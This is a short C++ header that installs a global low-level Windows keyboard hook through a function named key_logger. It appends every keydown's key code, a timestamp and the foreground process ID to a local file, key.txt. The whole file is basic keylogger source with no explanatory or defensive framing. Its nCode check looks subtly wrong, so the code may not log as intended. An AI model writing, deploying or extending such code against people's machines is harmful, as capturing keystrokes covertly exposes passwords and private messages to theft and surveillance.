#pragma once
#include<Windows.h>
#include<fstream>
#include<iostream>
#include<stdio.h>

using namespace std;

HHOOK g_hook = NULL;

LRESULT CALLBACK KeyBoardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode > 0 && wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* pKeyInfo = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
		DWORD ProcessId;
		GetWindowThreadProcessId(GetForegroundWindow(), &ProcessId);
		ofstream logFile("key.txt", ios_base::app);
		logFile << "Key code: " << pKeyInfo->vkCode
			<< "Timestamp: " << GetTickCount64()
			<< "Process Id: " << ProcessId << endl;
		logFile.close();
	}
	return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

void key_logger() {
	g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardHookProc, NULL, 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(g_hook);
}